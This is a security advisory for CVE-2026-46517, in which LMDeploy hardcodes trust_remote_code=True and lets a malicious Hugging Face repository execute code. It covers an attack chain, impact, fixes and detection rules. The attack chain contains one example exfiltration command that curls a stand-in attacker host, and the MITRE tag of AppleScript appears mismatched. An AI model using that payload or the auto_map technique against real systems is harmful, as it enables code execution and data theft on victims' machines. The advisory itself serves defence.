---
title: LMDeploy Hardcoded trust_remote_code Enables Remote Code Execution (CVE-2026-46517)
slug: 2026-05-lmdeploy-rce
description: LMDeploy <= 0.12.3 is vulnerable to remote code execution (CVE-2026-46517) because it hardcodes `trust_remote_code=True` when calling `transformers.AutoConfig.from_pretrained()`, allowing a malicious Hugging Face repository to execute arbitrary Python code when loaded without user opt-out.
date: "2026-05-21T19:34:00Z"
type: advisory
types:
  - advisory
severities:
  - medium
tags:
  - remote code execution
  - supply chain
  - lmdeploy
vendors:
  - Hugging Face
  - InternLM
products:
  - transformers
  - lmdeploy
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1199
    technique_name: Trusted Relationship
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059.002
    technique_name: 'Command and Scripting Interpreter: AppleScript'
references:
  - https://github.com/advisories/GHSA-9xq9-36w5-q796
iocs:
  - type: email
    value: sactransport2000@gmail.com
ioc_counts:
  email: 1
rules:
  - title: Detect LMDeploy Remote Code Execution via Configuration File Import
    description: Detects CVE-2026-46517 exploitation — Monitors for process creation events where Python imports a configuration file from a Hugging Face Transformers cache, indicating potential remote code execution via a malicious model repository.
    platform: sigma
    severity: medium
    tactics:
      - execution
      - initial_access
    techniques:
      - T1059.002
      - T1199
    data_sources:
      - process_creation
      - windows
  - title: Detect Network Connections from Hugging Face Cache
    description: Detects network connections initiated by Python processes originating from the Hugging Face Transformers cache directory, potentially indicating remote code execution.
    platform: sigma
    severity: low
    tactics:
      - command_and_control
    techniques:
      - T1071.001
    data_sources:
      - network_connection
      - windows
rules_count: 2
---

LMDeploy, a toolkit for large model deployment, is vulnerable due to its hardcoded `trust_remote_code=True` setting within the `transformers.AutoConfig.from_pretrained()` function calls. This bypasses the default-secure stance of Hugging Face Transformers (≥ 4.30) and allows arbitrary Python code execution when a user loads a model from a malicious Hugging Face repository. Specifically, this issue affects users running `lmdeploy serve api_server`, `lmdeploy lite calibrate`, or other related commands against untrusted repositories. The vulnerability stems from the lack of user control over the `trust_remote_code` parameter, and is tracked as CVE-2026-46517. The affected version is lmdeploy <= 0.12.3.

## Attack Chain

1.  Attacker creates a malicious Hugging Face repository containing a `config.json` file with an `auto_map` key pointing to a custom `configuration_evil.py` file.
2.  The `configuration_evil.py` file contains malicious Python code, such as `os.system("curl https://attacker/?$(whoami)")`, designed to execute when imported.
3.  A user, following a tutorial or benchmarking models, runs an lmdeploy command such as `lmdeploy serve api_server <attacker_repo>` or `lmdeploy lite calibrate <attacker_repo>`.
4.  LMDeploy calls `transformers.AutoConfig.from_pretrained(model_path, trust_remote_code=True)` due to the hardcoded `trust_remote_code=True` in `lmdeploy/archs.py`, `lmdeploy/lite/apis/calibrate.py`, and `lmdeploy/lite/utils/load.py`.
5.  Hugging Face Transformers downloads the `configuration_evil.py` file from the malicious repository.
6.  Hugging Face Transformers imports the `configuration_evil.py` module, causing the malicious Python code to execute.
7.  The attacker gains code execution on the user's machine with the privileges of the lmdeploy process.
8.  The attacker can then perform actions such as stealing credentials, installing malware, or compromising the system.

## Impact

Successful exploitation allows an attacker to execute arbitrary code on the victim's machine. The impact includes potential data theft, system compromise, and further propagation of the attack. This vulnerability affects any user of LMDeploy who loads models from untrusted sources, impacting casual users, CI pipelines, and researchers. The vulnerability exists because LMDeploy overrides Hugging Face's default-secure stance without providing any warning or opt-out mechanism to the user.

## Recommendation

*   Upgrade to a patched version of LMDeploy that includes a CLI flag for `--trust-remote-code` defaulting to False, as described in the Suggested fix section.
*   Deploy the Sigma rule `Detect LMDeploy Remote Code Execution via Configuration File Import` to detect potential exploitation attempts by monitoring process creation events related to Python and file paths from the Hugging Face cache.
*   Exercise extreme caution when loading models from untrusted Hugging Face repositories with LMDeploy, and avoid running LMDeploy commands against repositories that have not been thoroughly vetted.
*   Monitor network connections initiated by Python processes originating from the Hugging Face Transformers cache directory, using a network connection monitoring rule.
